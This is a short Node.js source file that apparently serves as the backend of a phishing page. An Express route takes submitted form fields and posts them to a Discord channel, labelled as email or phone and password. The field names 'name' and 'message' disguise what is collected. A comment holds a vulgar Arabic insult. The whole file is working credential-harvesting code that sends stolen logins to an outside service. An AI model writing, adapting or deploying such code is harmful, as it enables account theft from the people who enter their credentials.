const express = require('express');
const bodyParser = require('body-parser');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const port = process.env.PORT || 3000;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const channelName = '🏀・𝗔𝗖𝗖𝗢𝗨𝗡𝗧・🏀';

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});
/// يا قحبه خذ توكن وبنيكك
client.login(process.env.token);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/send-message', (req, res) => {
  const { name, message } = req.body;

   const channel = client.channels.cache.find(ch => ch.name === channelName);

  if (channel) {
    channel.send(`**🏀・EMAIL OR PHONE ・ \`${name}\` ・** **PASSWORD・ \`${message}\` ・🏀**`);
    res.send('Message sent successfully!');
  } else {
    res.status(404).send('Channel not found');
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
